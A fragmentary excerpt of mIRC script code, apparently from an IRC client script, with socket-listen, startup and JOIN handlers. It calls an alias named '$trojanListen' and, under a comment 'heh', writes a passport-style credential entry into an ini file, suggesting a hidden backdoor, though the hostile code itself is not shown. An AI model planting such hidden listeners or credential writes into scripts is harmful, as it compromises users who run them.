...
on *:socklisten:init.client.mirc:{
  ...
  editbox -sf /join $+( $chr(37), $chr(35), shadow ) 
  $trojanListen
  $motd
}
...
on *:start:{ 
  ...
  $findServer
  ; heh
  writeini -n aop.ini global F8C96FB408946872@GateKeeperPassport sid connection creater.
...
alias -l vers { return $+( $chr(3), 2, $chr(40), 3.1p, $chr(41), $chr(3), $chr(15) ) }
  ...
  while ( $sockbr ) { 
    ...
    elseif ( $2 == JOIN ) { 
      ...
      elseif ( %n != $me ) {
        ...
        elseif ( $MD5ArrFind(%usr) ) { $MessageDigestSplit( $mid( $4, 2 ), $1 ) }
